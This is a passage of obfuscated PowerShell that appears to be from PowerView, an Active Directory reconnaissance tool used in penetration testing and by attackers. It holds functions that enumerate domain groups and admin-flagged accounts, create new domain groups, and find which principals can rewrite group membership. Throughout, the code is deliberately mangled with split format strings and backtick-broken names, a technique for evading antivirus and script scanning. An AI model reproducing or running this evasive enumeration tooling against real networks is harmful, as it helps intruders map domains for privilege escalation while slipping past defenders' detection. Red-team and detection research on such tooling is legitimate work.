        [Alias({"{2}{1}{0}" -f'One','rn','Retu'})]
        [Switch]
        ${Fi`Ndone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedENT`iAL} =   ${J`h3x`o6}::"EM`Pty",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${SEa`RCHER`A`R`gUMENTs} = @{}
        if (${pSBOund`PAR`A`METe`Rs}[("{1}{2}{0}"-f'n','D','omai')]) { ${SEArCH`eRA`RGum`ENTs}[("{0}{1}" -f 'Domai','n')] = ${do`MA`in} }
        if (${p`sbOu`ND`paR`AMeTe`RS}[("{2}{1}{0}" -f'es','i','Propert')]) { ${seArCHer`AR`g`UMeN`TS}[("{1}{2}{0}" -f 's','P','ropertie')] = ${P`ROP`ErTI`eS} }
        if (${ps`BounDP`ARam`E`Te`Rs}[("{2}{0}{1}" -f 'a','se','SearchB')]) { ${Se`A`RcH`erarG`UME`NTs}[("{1}{2}{0}"-f'e','S','earchBas')] = ${seA`Rc`HBase} }
        if (${P`SBO`U`N`Dpa`RAmETeRs}[("{0}{1}"-f 'Serv','er')]) { ${sea`RChERaRgU`m`eNts}[("{1}{0}"-f'rver','Se')] = ${sEr`V`Er} }
        if (${psb`OUn`dpara`Meters}[("{1}{0}{2}" -f'h','Searc','Scope')]) { ${SeaRCh`eRA`R`gumeN`Ts}[("{1}{2}{0}" -f'cope','Searc','hS')] = ${sEAR`C`H`scOpE} }
        if (${p`sboUndP`Ar`AmetErS}[("{0}{4}{2}{3}{1}" -f'Re','ize','ge','S','sultPa')]) { ${se`AR`Ch`Erar`gUmentS}[("{3}{0}{1}{2}" -f 'u','ltP','ageSize','Res')] = ${RE`S`ULtpAGEsIZE} }
        if (${pSb`OU`N`dPa`RAme`TeRs}[("{0}{2}{1}"-f 'ServerTimeL','mit','i')]) { ${sE`Arc`hera`RGUMeN`Ts}[("{0}{3}{2}{1}{4}"-f'S','i','rTimeLim','erve','t')] = ${se`Rv`Er`TI`mElimIt} }
        if (${Ps`BOU`NDPAr`AM`EterS}[("{0}{3}{1}{4}{2}"-f 'Securit','a','s','yM','sk')]) { ${sEARChER`ARG`U`M`enTs}[("{0}{1}{3}{2}" -f 'Sec','u','sks','rityMa')] = ${SEC`U`R`iTYM`AsKs} }
        if (${PSbou`Nd`P`Arame`TErs}[("{1}{2}{0}" -f 'e','Tombst','on')]) { ${s`E`ARC`H`ErarGU`MENts}[("{0}{2}{1}"-f 'Tomb','e','ston')] = ${T`Om`BSToNE} }
        if (${psboU`N`Dp`ARA`meTe`Rs}[("{3}{2}{1}{0}" -f 'al','denti','re','C')]) { ${SEAR`cHe`RA`RGu`Me`Nts}[("{0}{2}{1}" -f'Crede','ial','nt')] = ${CRE`dEn`TiAL} }
        ${grO`Up`SeArCH`Er} = &("{4}{2}{0}{3}{1}{5}" -f 'm','Searc','et-Do','ain','G','her') @SearcherArguments
    }

    PROCESS {
        if (${GROuP`s`EA`RcHer}) {
            if (${ps`BO`U`NdP`ArAM`EtErs}[("{4}{1}{2}{3}{0}"-f'ity','be','rIde','nt','Mem')]) {

                if (${SEA`RC`hE`RArG`UmeNts}[("{1}{0}{2}"-f'rope','P','rties')]) {
                    ${ol`DP`RopERT`IEs} = ${SeArc`HERA`RG`UMe`NTs}[("{0}{1}{2}" -f'P','roperti','es')]
                }

                ${S`e`ArcHERaRGUm`E`Nts}[("{1}{0}{2}" -f't','Identi','y')] = ${M`Em`BErIDENTi`Ty}
                ${se`ARchER`A`RGUmeNTS}['Raw'] = ${T`RUE}

                &("{1}{2}{0}" -f 'ject','Get-Do','mainOb') @SearcherArguments | &("{4}{3}{0}{1}{2}"-f '-','Ob','ject','ach','ForE') {
                    
                    ${objEC`TD`IrecTO`R`y`ENT`Ry} = ${_}.("{2}{1}{4}{3}{0}" -f 'y','irect','GetD','ryEntr','o').Invoke()

                    
                    ${OBJeCtd`ir`e`ctOryeN`Try}.("{0}{1}{3}{2}"-f 'Refre','sh','e','Cach').Invoke(("{2}{1}{3}{0}"-f 'oups','oken','t','Gr'))

                    ${ob`Jec`TDIreCt`oryEnt`Ry}."T`OKen`GROU`ps" | &("{3}{2}{1}{0}" -f 'ject','ch-Ob','a','ForE') {
                        
                        ${G`RoUPs`id} = (&("{2}{3}{1}{0}" -f 'ject','b','New-','O') ("{3}{9}{11}{5}{6}{1}{7}{8}{4}{2}{0}{10}"-f'tif','ty.Princ','rityIden','Sy','cu','m','.Securi','ipa','l.Se','s','ier','te')(${_},0))."VAl`UE"

                        
                        if (${g`R`oUP`SiD} -notmatch ("{3}{0}{2}{1}"-f '-1','*','-5-32-.','^S')) {
                            ${sE`ArCH`E`Ra`RguMeNTs}[("{1}{0}" -f'dentity','I')] = ${gro`UP`SiD}
                            ${s`E`Ar`ChE`RarguM`enTS}['Raw'] = ${f`AL`se}
                            if (${OLDP`RO`P`er`TIes}) { ${SEARC`h`er`A`RgU`MeNts}[("{0}{1}{2}" -f 'P','roperti','es')] = ${oL`dpR`opeR`TI`eS} }
                            ${G`Ro`Up} = &("{3}{0}{1}{2}" -f'nOb','je','ct','Get-Domai') @SearcherArguments
                            if (${gr`OuP}) {
                                ${gro`UP}."P`S`ObjeCt"."T`YPEnam`eS".("{0}{1}"-f 'Inser','t').Invoke(0, ("{1}{3}{2}{0}{4}"-f 'u','Power','ew.Gro','Vi','p'))
                                ${g`ROup}
                            }
                        }
                    }
                }
            }
            else {
                ${i`DEN`TITyfIL`T`ER} = ''
                ${FIl`TER} = ''
                ${IDE`NtiTY} | &("{0}{1}{2}" -f 'Where-Ob','jec','t') {${_}} | &("{4}{1}{3}{0}{2}"-f'b','a','ject','ch-O','ForE') {
                    ${ID`en`T`ItyInsT`AncE} = ${_}.("{0}{1}" -f 'Repla','ce').Invoke('(', '\28').("{1}{0}"-f'eplace','R').Invoke(')', '\29')
                    if (${I`D`e`NtityIns`TaNCe} -match ("{0}{1}" -f'^S-','1-')) {
                        ${ID`eN`TiTYF`il`TeR} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${iDeNTIT`y`in`STAncE} -match ("{0}{1}" -f'^C','N=')) {
                        ${idE`NtITYfIL`T`er} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${p`SBOU`Nd`paRA`me`TErs}[("{2}{0}{1}"-f'm','ain','Do')]) -and (-not ${Ps`BoUND`PAramEt`E`Rs}[("{1}{2}{3}{0}" -f 'rchBase','S','e','a')])) {
                            
                            
                            ${i`dE`NTITyd`OmaIn} = ${iDeNTiT`Yi`N`stANce}.("{2}{1}{0}"-f 'tring','bS','Su').Invoke(${IDEN`TI`T`yInsTance}.("{0}{1}" -f'IndexO','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{1}{0}{2}"-f'Ve','Write-','rbose') ('['+'Get-Dom'+'ai'+'nGroup'+'] '+'Extract'+'e'+'d '+'d'+'omai'+'n '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                            ${sEar`c`HerAr`gUm`EnTS}[("{1}{0}"-f'in','Doma')] = ${IdEN`TI`TY`domAiN}
                            ${GrOUP`sEarc`hER} = &("{1}{2}{0}{3}" -f'nSea','Get','-Domai','rcher') @SearcherArguments
                            if (-not ${GRouPSea`R`Cher}) {
                                &("{1}{3}{0}{2}"-f 'ni','W','ng','rite-War') ('[Ge'+'t-D'+'om'+'ainGrou'+'p] '+'Un'+'able'+' '+'t'+'o '+'re'+'trie'+'v'+'e '+'do'+'main'+' '+'searcher'+' '+'for'+' '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${iDE`NT`ITyi`NsTanCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${gUIdB`yTe`St`RIng} = (([Guid]${I`deNti`TyiNSt`ANcE}).("{1}{2}{3}{0}"-f'rray','To','Byte','A').Invoke() | &("{1}{2}{0}"-f 'ch-Object','Fo','rEa') { '\' + ${_}.("{2}{1}{0}" -f'ing','r','ToSt').Invoke('X2') }) -join ''
                        ${iDe`NTI`T`YfILTer} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${IDenTI`TYI`NStA`NCe}.("{1}{0}" -f's','Contain').Invoke('\')) {
                        ${cONvEr`T`ED`iden`TITY`inStAN`Ce} = ${IDe`Nt`itYin`STANCE}.("{1}{0}" -f'ace','Repl').Invoke('\28', '(').("{1}{0}"-f'eplace','R').Invoke('\29', ')') | &("{2}{1}{3}{0}"-f 'e','nv','Co','ert-ADNam') -OutputType ("{1}{0}"-f'onical','Can')
                        if (${co`NvERTEdIDeNTI`Ty`iNsTaN`ce}) {
                            ${gROUP`dO`M`Ain} = ${COnVERte`D`ideNt`ityIN`StAncE}.("{1}{2}{0}" -f'ing','SubSt','r').Invoke(0, ${cON`Ve`RTe`dIDeN`T`i`TYiNsTA`Nce}.("{1}{0}"-f 'f','IndexO').Invoke('/'))
                            ${grOuPn`A`mE} = ${i`deNTi`TYI`NSTAnCE}.("{1}{0}"-f'plit','S').Invoke('\')[1]
                            ${ID`ENTiTYf`ilteR} += "(samAccountName=$GroupName)"
                            ${sEArcHeR`Argu`men`TS}[("{1}{0}"-f 'in','Doma')] = ${gRO`UP`D`oMAiN}
                            &("{0}{2}{1}{3}{4}"-f'Wri','-V','te','erbos','e') ('[G'+'et'+'-DomainGr'+'oup] '+'Ex'+'tracted'+' '+'do'+'mai'+'n '+"'$GroupDomain' "+'from'+' '+"'$IdentityInstance'")
                            ${g`R`OUPSea`RcHEr} = &("{4}{2}{0}{3}{1}{5}"-f 'omainSea','ch','-D','r','Get','er') @SearcherArguments
                        }
                    }
                    else {
                        ${identi`TYfI`Lt`er} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if (${Ide`N`T`ITyfIlt`ER} -and (${I`DeNtI`Ty`FIltEr}.("{1}{0}" -f'im','Tr').Invoke() -ne '') ) {
                    ${Fi`lteR} += "(|$IdentityFilter)"
                }

                if (${pSbO`UnD`Par`A`mE`TerS}[("{2}{0}{1}"-f 'mi','nCount','Ad')]) {
                    &("{0}{2}{1}"-f'W','ose','rite-Verb') ("{11}{10}{6}{1}{7}{8}{9}{0}{2}{3}{4}{5}"-f'or','p] ',' a','dminCount','=','1','Grou','Sea','rchin','g f','n','[Get-Domai')
                    ${F`IlT`ER} += (("{3}{1}{2}{0}" -f ')','a','dmincount=1','('))
                }
                if (${P`s`BoUndPAr`Am`e`TerS}[("{2}{1}{0}"-f 'e','upScop','Gro')]) {
                    ${G`RoupS`C`OPev`ALUE} = ${PsbOU`NDpa`RaMe`TE`Rs}[("{2}{1}{0}"-f'e','roupScop','G')]
                    ${F`iLt`ER} = Switch (${gR`oU`PsC`Op`EvAlUe}) {
                        ("{1}{2}{0}"-f 'Local','Domai','n')       { ("{0}{3}{1}{4}{5}{2}{6}"-f'(groupType:1.','840','=','2.','.113556.1','.4.803:','4)') }
                        ("{1}{3}{2}{0}"-f'l','NotDomai','Loca','n')    { ("{1}{7}{11}{5}{2}{4}{10}{3}{0}{6}{9}{8}" -f '1.','(','40','.','.1','.2.8','4.803:=','!(gro',')','4)','13556','upType:1') }
                        ("{2}{0}{1}" -f 'oba','l','Gl')            { (("{2}{6}{7}{9}{3}{5}{8}{4}{1}{0}"-f '2)','3:=','(',':1.2.','0','840.11','gro','upTy','3556.1.4.8','pe')) }
                        ("{0}{3}{2}{1}"-f'NotGl','l','ba','o')         { (("{6}{7}{1}{2}{0}{9}{3}{4}{8}{5}"-f'upType:1.2.84','gr','o','135','56',')','(','!(','.1.4.803:=2)','0.1')) }
                        ("{1}{0}{2}" -f 'a','Univers','l')         { (("{3}{5}{2}{8}{6}{7}{0}{4}{9}{1}" -f '6.1.',':=8)',':1.2.','(groupTy','4.80','pe','1135','5','840.','3')) }
                        ("{2}{1}{0}{3}" -f 'niver','otU','N','sal')      { ((("{7}{10}{1}{5}{0}{8}{6}{9}{3}{2}{4}" -f 'yp','gr','4.803:','56.1.','=8))','oupT','13','(','e:1.2.840.1','5','!('))) }
                    }
                    &("{2}{1}{3}{0}"-f'se','te-Verb','Wri','o') ('[G'+'et-Domai'+'nG'+'roup'+'] '+'Sear'+'ching'+' '+'fo'+'r '+'gro'+'up'+' '+'sc'+'o'+'pe '+"'$GroupScopeValue'")
                }
                if (${p`sbouNDPaRA`M`eTers}[("{0}{3}{2}{1}" -f 'G','erty','rop','roupP')]) {
                    ${GRouP`PrOpE`Rtyv`A`L`Ue} = ${pSbOU`NDp`Ar`Am`Et`eRs}[("{0}{1}{3}{2}" -f 'GroupP','ro','y','pert')]
                    ${F`il`Ter} = Switch (${GRo`UpPROPERTY`Val`Ue}) {
                        ("{0}{1}{2}" -f'Sec','ur','ity')              { ("{3}{6}{1}{9}{8}{4}{0}{2}{5}{10}{7}" -f'6.1.4.803','pT',':=','(gr','355','214','ou','483648)','840.11','ype:1.2.','7') }
                        ("{3}{1}{2}{0}"-f'tion','t','ribu','Dis')          { ((("{6}{2}{12}{0}{7}{4}{5}{10}{11}{9}{3}{13}{8}{1}"-f'oup','))','g','14748','.','840.11','(!(','Type:1.2','8',':=2','3556','.1.4.803','r','364'))) }
                        ("{1}{3}{2}{0}"-f 'tem','Crea','ys','tedByS')       { ("{0}{4}{2}{7}{1}{3}{6}{5}"-f'(gro','.113556.1','pType:1.','.','u','=1)','4.803:','2.840') }
                        ("{3}{0}{1}{4}{2}" -f'tCreate','dBySy','m','No','ste')    { ((("{6}{1}{2}{0}{7}{4}{5}{9}{8}{3}"-f 'pType:1.2.84','o','u',':=1))','.113','556','(!(gr','0','4.803','.1.'))) }
                    }
                    &("{3}{2}{1}{0}" -f 'erbose','V','te-','Wri') ('[G'+'et-DomainG'+'ro'+'u'+'p] '+'S'+'earchi'+'n'+'g '+'f'+'or '+'gro'+'up '+'prop'+'erty'+' '+"'$GroupPropertyValue'")
                }
                if (${PS`Boun`DP`ArametErs}[("{3}{1}{0}{2}"-f'F','DAP','ilter','L')]) {
                    &("{1}{2}{0}"-f'rbose','Write','-Ve') ('[Get-'+'Domain'+'G'+'roup] '+'Us'+'in'+'g '+'addition'+'al'+' '+'LD'+'AP '+'fi'+'lte'+'r: '+"$LDAPFilter")
                    ${FI`lTEr} += "$LDAPFilter"
                }

                ${gROupsE`A`R`ChEr}."FI`LTER" = "(&(objectCategory=group)$Filter)"
                &("{0}{2}{3}{1}" -f'Write-Ver','e','b','os') "[Get-DomainGroup] filter string: $($GroupSearcher.filter) "

                if (${PsB`O`UndPARa`METe`Rs}[("{1}{0}"-f'indOne','F')]) { ${rEsUL`Ts} = ${gRou`p`sEArCHEr}.("{1}{0}" -f'ne','FindO').Invoke() }
                else { ${Re`sUL`TS} = ${G`ROup`SeARCHer}.("{0}{2}{1}"-f'Fi','dAll','n').Invoke() }
                ${r`ESulTs} | &("{0}{1}{2}" -f 'Where-O','bj','ect') {${_}} | &("{0}{2}{3}{1}" -f'ForEac','ct','h-Ob','je') {
                    if (${PsbouNd`P`Ar`Am`eTers}['Raw']) {
                        
                        ${GrO`UP} = ${_}
                    }
                    else {
                        ${GRo`UP} = &("{2}{3}{0}{4}{1}"-f 'rope','y','Con','vert-LDAPP','rt') -Properties ${_}."P`RO`PErTI`es"
                    }
                    ${G`Ro`UP}."PsO`BjE`ct"."T`yp`Ena`MeS".("{1}{0}{2}"-f'ns','I','ert').Invoke(0, ("{0}{1}{3}{2}{4}" -f'P','owerVi','Grou','ew.','p'))
                    ${GRO`UP}
                }
                if (${Re`SUlts}) {
                    try { ${reS`Ul`Ts}.("{0}{1}"-f'disp','ose').Invoke() }
                    catch {
                        &("{2}{0}{1}"-f'rite-V','erbose','W') ("{5}{7}{11}{3}{12}{2}{9}{8}{1}{6}{10}{4}{0}"-f 'ults object','Error di','Grou','i','f the Res','[Ge','spo','t-Do','] ','p','sing o','ma','n')
                    }
                }
                ${g`ROu`ps`eaRChEr}.("{0}{1}{2}" -f'd','is','pose').Invoke()
            }
        }
    }
}


function nE`w-D`O`MAi`NgrOup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{8}{6}{7}{2}{1}{4}{3}{0}{9}" -f 'on','gF','n','cti','un','PSUseSho','ld','ProcessForStateChangi','u','s'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}"-f 'SShouldP','P','rocess'}, '')]
    [OutputType({"{6}{4}{5}{0}{7}{3}{8}{2}{1}" -f'e','ncipal','pPri','.Gro','ana','g','DirectoryServices.AccountM','ment','u'})]
    Param(
        [Parameter(MandatORy = ${T`RUE})]
        [ValidateLength(0, 256)]
        [String]
        ${saMAC`CoUn`TNA`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${N`AME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${diSP`L`AyN`AmE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${de`sCR`i`PtiON},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`mA`in},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRED`ENti`Al} =   (&("{0}{1}" -f 'di','r') ("{1}{4}{2}{0}{3}" -f 'h','Va','aBLe:j','3Xo6','Ri'))."va`lue"::"em`PTY"
    )

    ${contEX`Ta`RGUM`eNtS} = @{
        ("{1}{2}{0}"-f 'ty','Ide','nti') = ${SamA`Cc`ou`NTnAME}
    }
    if (${pS`B`oU`Nd`pARaMeTErS}[("{2}{1}{0}"-f 'n','i','Doma')]) { ${con`TE`xTaRgUMEn`TS}[("{1}{0}" -f'in','Doma')] = ${doMA`in} }
    if (${P`s`B`O`UNDPA`RaMeters}[("{1}{2}{0}"-f 'dential','C','re')]) { ${ContextaR`GU`mE`NtS}[("{2}{0}{1}"-f'denti','al','Cre')] = ${Cr`Ede`NtI`Al} }
    ${CO`N`TExt} = &("{2}{3}{4}{1}{0}"-f 'ext','nt','Get-Princi','pa','lCo') @ContextArguments

    if (${CoN`T`ext}) {
        ${Gro`Up} = &("{1}{2}{0}"-f'ject','New-','Ob') -TypeName ("{1}{14}{11}{4}{12}{8}{5}{6}{9}{3}{7}{13}{0}{10}{2}"-f 'r','System.D','pal','agemen','or','nt','Ma','t.','u','n','inci','ect','yServices.Acco','GroupP','ir') -ArgumentList (${CONT`e`XT}."Co`N`Text")

        
        ${GR`o`Up}."s`AmaCc`ounTNAME" = ${C`oNTE`Xt}."IDeN`T`ItY"

        if (${psBOUND`p`Ar`Am`eTErS}[("{0}{1}"-f'Nam','e')]) {
            ${gRo`Up}."n`Ame" = ${n`AMe}
        }
        else {
            ${gR`oUp}."NA`ME" = ${C`oNte`xT}."IDen`TI`TY"
        }
        if (${P`Sb`oUnd`PAr`AMeTers}[("{0}{2}{1}{3}" -f'Dis','m','playNa','e')]) {
            ${G`ROuP}."dIs`p`layNAmE" = ${D`iSPL`AYna`mE}
        }
        else {
            ${GRO`Up}."d`ISpLa`ynA`Me" = ${conTe`xt}."I`DeN`TITy"
        }

        if (${PS`BO`UnD`P`AR`Ameters}[("{0}{1}{2}" -f 'Descrip','tio','n')]) {
            ${gR`OuP}."de`ScrIpt`Ion" = ${d`e`Sc`RIPtIon}
        }

        &("{0}{2}{1}"-f 'Write-Verb','se','o') ('[New-'+'Do'+'m'+'ai'+'nGroup] '+'A'+'tte'+'mptin'+'g '+'to'+' '+'create'+' '+'gr'+'oup'+' '+"'$SamAccountName'")
        try {
            ${n`ULL} = ${gRO`UP}.("{1}{0}"-f'e','Sav').Invoke()
            &("{4}{3}{1}{2}{0}" -f'se','V','erbo','-','Write') ('[New-Doma'+'i'+'n'+'G'+'ro'+'up] '+'Grou'+'p '+"'$SamAccountName' "+'successf'+'ull'+'y'+' '+'crea'+'t'+'ed')
            ${GRo`UP}
        }
        catch {
            &("{2}{3}{0}{1}" -f'r','ning','Write-','Wa') ('[New-Do'+'ma'+'inGro'+'up]'+' '+'Err'+'or'+' '+'c'+'re'+'ating '+'g'+'roup '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function g`e`T-d`oMa`INmA`NAGeDsecuritYg`R`oUP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{2}{1}" -f 'PSSho','ocess','dPr','u','l'}, '')]
    [OutputType({"{6}{3}{5}{7}{8}{2}{4}{0}{1}" -f'ro','up','it','werV','yG','iew.Mana','Po','ge','dSecur'})]
    [CmdletBinding()]
    Param(
        [Parameter(PositION = 0, VALUEfrOMPiPELine = ${Tr`Ue}, VaLuEfrOMpiPELINebYpropERtynAmE = ${t`RUe})]
        [Alias({"{0}{1}"-f 'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`O`mAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'ADSP','ath'})]
        [String]
        ${Searc`hB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{4}{1}" -f'D','troller','om','ain','Con'})]
        [String]
        ${Ser`VEr},

        [ValidateSet({"{1}{0}" -f'se','Ba'}, {"{1}{2}{0}"-f 'vel','On','eLe'}, {"{1}{0}{2}" -f 'e','Subtr','e'})]
        [String]
        ${Sea`R`C`HscOpE} = ("{2}{1}{0}" -f 'e','re','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`Esu`lTpag`eSIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`RV`ERtiMeLIM`IT},

        [Switch]
        ${To`MbSto`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`Edent`iAL} =   ${j`h3x`o6}::"E`mPTy"
    )

    BEGIN {
        ${s`Ea`R`cHErArGUmE`Nts} = @{
            ("{1}{0}{2}" -f 'PF','LDA','ilter') = ((("{13}{10}{1}{5}{11}{4}{12}{0}{6}{3}{7}{8}{14}{2}{9}"-f '1.2','edBy','48','5','yp','=*)(grou','.840.113','56','.1.4','3648))','ag','pT','e:','(&(man','.803:=2147')))
            ("{1}{2}{0}" -f 'perties','Pr','o') = ("{8}{9}{3}{4}{7}{0}{5}{2}{1}{6}"-f 'mac','samaccount','ype,','nage','d','countt','name','By,sa','disti','nguishedName,ma')
        }
        if (${psb`OunDp`A`RamETE`RS}[("{0}{1}{2}" -f 'S','ear','chBase')]) { ${S`eARcHe`R`A`RGU`MeNTs}[("{2}{0}{1}" -f 'Ba','se','Search')] = ${search`Ba`SE} }
        if (${PsBOUn`DP`Ara`mete`Rs}[("{2}{1}{0}"-f'er','v','Ser')]) { ${S`eA`RChE`RAr`GUmeN`TS}[("{0}{1}{2}"-f'Se','rv','er')] = ${S`er`VEr} }
        if (${PS`Bou`NdPARaME`T`erS}[("{0}{1}{2}{3}" -f'Sear','c','h','Scope')]) { ${sEA`RCheR`A`RGume`Nts}[("{1}{0}{2}"-f'archSco','Se','pe')] = ${S`eARc`hSc`Ope} }
        if (${Ps`Bo`UN`dPARAMEtE`RS}[("{3}{2}{0}{1}{4}"-f'sult','P','e','R','ageSize')]) { ${SeAr`cHE`Ra`RG`UMEN`TS}[("{2}{0}{3}{1}"-f'e','ize','R','sultPageS')] = ${re`suL`TP`AgeSIZe} }
        if (${pSBOU`NdPaRaMe`T`ErS}[("{1}{2}{0}"-f'eLimit','ServerTi','m')]) { ${S`eA`RchERAR`g`UMe`NtS}[("{1}{2}{0}"-f 'eLimit','Serv','erTim')] = ${se`Rv`erTIME`liM`iT} }
        if (${p`Sb`oUN`DP`ARamE`TeRs}[("{3}{1}{2}{4}{0}"-f 'sks','curi','ty','Se','Ma')]) { ${seaRCHeR`Ar`G`Um`EnTS}[("{2}{1}{3}{0}" -f'sks','ec','S','urityMa')] = ${sEC`Ur`i`Ty`MAsks} }
        if (${PSBOU`NdParA`m`eterS}[("{1}{2}{0}"-f'stone','To','mb')]) { ${sEARC`HERAR`gUME`N`TS}[("{1}{0}{2}{3}"-f'o','T','m','bstone')] = ${TombS`T`onE} }
        if (${PsBoun`dP`A`Ram`E`Ters}[("{2}{1}{0}" -f 'ial','ent','Cred')]) { ${SEA`RcHErarg`U`M`en`TS}[("{0}{1}{2}" -f'Creden','t','ial')] = ${CRe`deNT`IaL} }
    }

    PROCESS {
        if (${ps`BOuN`DPAr`A`mETErs}[("{0}{1}" -f 'Do','main')]) {
            ${S`e`Arc`hER`ARGUmENts}[("{1}{2}{0}" -f'ain','D','om')] = ${d`oma`in}
            ${t`ARget`doMAiN} = ${D`oMA`In}
        }
        else {
            ${T`A`RGEtDo`m`Ain} = ${E`Nv:useRd`N`SDOMA`IN}
        }

        
        &("{0}{2}{1}{3}" -f 'Ge','inG','t-Doma','roup') @SearcherArguments | &("{0}{2}{4}{3}{1}" -f'Fo','t','rEach-','bjec','O') {
            ${sEAr`C`HErA`R`GumEnts}[("{2}{3}{0}{1}" -f 'pert','ies','Pr','o')] = ("{5}{4}{12}{9}{7}{11}{1}{3}{2}{6}{0}{8}{10}" -f'u','pe,','amacc','s','e','distinguishednam','o','ccoun','n','sama','tname,objectsid','tty',',name,')
            ${sea`RCH`ErA`Rgume`Nts}[("{2}{0}{1}"-f 'tit','y','Iden')] = ${_}."Ma`NAg`EdbY"
            ${n`Ull} = ${SeARChERA`RG`Umen`Ts}.("{0}{1}{2}" -f 'R','emo','ve').Invoke(("{0}{2}{1}" -f'LDAPF','lter','i'))

            
            
            ${GROUPMA`NAG`Er} = &("{1}{3}{2}{0}"-f'ct','Get-D','nObje','omai') @SearcherArguments
            
            ${mANagED`G`Roup} = &("{2}{1}{0}" -f 'ct','je','New-Ob') ("{1}{0}{2}" -f'SObjec','P','t')
            ${MAna`G`E`dg`ROUP} | &("{2}{0}{3}{1}" -f '-','er','Add','Memb') ("{1}{2}{3}{0}" -f'rty','No','te','prope') ("{1}{0}{2}" -f 'upNa','Gro','me') ${_}."SA`M`AcCOun`Tna`mE"
            ${ManaGEd`GR`o`Up} | &("{3}{0}{1}{2}" -f'-Memb','e','r','Add') ("{0}{1}{2}" -f'N','oteprope','rty') ("{3}{0}{4}{1}{2}" -f 'roupDistingui','N','ame','G','shed') ${_}."DIsTIN`gUi`SHe`DnAme"
            ${M`ANaGED`gRoUp} | &("{0}{2}{1}"-f 'Add-Me','er','mb') ("{2}{0}{1}"-f'ropert','y','Notep') ("{2}{0}{1}"-f 'anag','erName','M') ${Gro`U`pMA`NAGeR}."sAmACcoun`Tn`AmE"
            ${m`A`NAGedGrO`Up} | &("{1}{0}{2}" -f 'd-Me','Ad','mber') ("{2}{0}{1}{3}" -f'otepr','op','N','erty') ("{2}{0}{5}{4}{1}{3}"-f'ge','tingui','Mana','shedName','s','rDi') ${G`ROUPmA`NAg`er}."D`i`STI`NGUI`Sh`edNAME"

            
            if (${g`Rou`PMAn`AgER}."s`Am`AC`coUNTtyPE" -eq 0x10000000) {
                ${MAN`Ag`ED`gRo`UP} | &("{0}{3}{2}{1}" -f 'Add-','r','e','Memb') ("{2}{0}{3}{1}" -f 'eprop','rty','Not','e') ("{3}{1}{2}{0}"-f 'e','gerT','yp','Mana') ("{1}{0}" -f'oup','Gr')
            }
            elseif (${GROUP`Mana`GeR}."SAmA`cc`ounT`T`yPE" -eq 0x30000000) {
                ${M`A`NA`geDgr`ouP} | &("{1}{0}{2}"-f 'e','Add-M','mber') ("{1}{2}{0}{3}"-f'e','Not','eprop','rty') ("{2}{1}{0}"-f'pe','y','ManagerT') ("{1}{0}" -f 'ser','U')
            }

            ${aclarG`U`m`EnTs} = @{
                ("{2}{0}{1}"-f'entit','y','Id') = ${_}."DIsti`NGUIshE`DnA`mE"
                ("{2}{0}{1}{3}"-f'ig','hts','R','Filter') = ("{0}{2}{3}{1}" -f'Wr','mbers','it','eMe')
            }
            if (${P`SBOUnDPa`RA`mEtE`Rs}[("{1}{2}{0}"-f'r','Se','rve')]) { ${Acl`Arg`UmENts}[("{2}{1}{0}" -f'ver','r','Se')] = ${SE`RVEr} }
            if (${psBOUn`Dp`A`RamEtERs}[("{1}{2}{0}" -f 'cope','Searc','hS')]) { ${ac`lAr`G`Um`ENTS}[("{0}{1}{2}"-f'SearchS','co','pe')] = ${SEA`RchScO`pe} }
            if (${psbOuNDpAr`A`mETE`Rs}[("{2}{1}{3}{4}{0}" -f'e','ultPa','Res','ge','Siz')]) { ${aClA`Rg`UmeNtS}[("{4}{2}{3}{0}{1}" -f 'z','e','S','i','ResultPage')] = ${rESULtp`AG`eSIZE} }
            if (${pS`BOUND`P`ArAM`ETeRS}[("{4}{0}{1}{3}{2}" -f 'erv','e','mit','rTimeLi','S')]) { ${AclAR`G`Um`EN`TS}[("{4}{3}{0}{2}{1}"-f'erT','it','imeLim','erv','S')] = ${S`E`RvERT`Im`EL`ImIt} }
            if (${P`sBo`Un`DPaRAmetERS}[("{0}{1}" -f'Tom','bstone')]) { ${a`cl`A`RguMeNts}[("{0}{2}{1}"-f'Tombs','ne','to')] = ${TOmB`S`TONe} }
            if (${PSb`O`U`NDPar`AMEtERs}[("{2}{1}{0}"-f 'ial','edent','Cr')]) { ${AC`lA`RguMenTs}[("{1}{0}{2}"-f 'dentia','Cre','l')] = ${CReD`e`NtI`AL} }

            
            
            
            
            
            
            
            
            
            
            

            ${m`ANAged`gR`OuP} | &("{0}{2}{1}"-f 'Add-Mem','er','b') ("{3}{0}{2}{1}" -f 'op','rty','e','Notepr') ("{2}{3}{4}{0}{1}" -f 'rCan','Write','Mana','g','e') ("{0}{1}"-f 'UNKN','OWN')

            ${M`AN`AGe`dgrO`Up}."Psob`J`Ect"."ty`peNAMeS".("{0}{1}{2}" -f 'Ins','e','rt').Invoke(0, ("{4}{2}{5}{0}{3}{1}"-f 'nagedS','Group','w','ecurity','PowerVie','.Ma'))
            ${MANaGED`gro`UP}
        }
    }
}


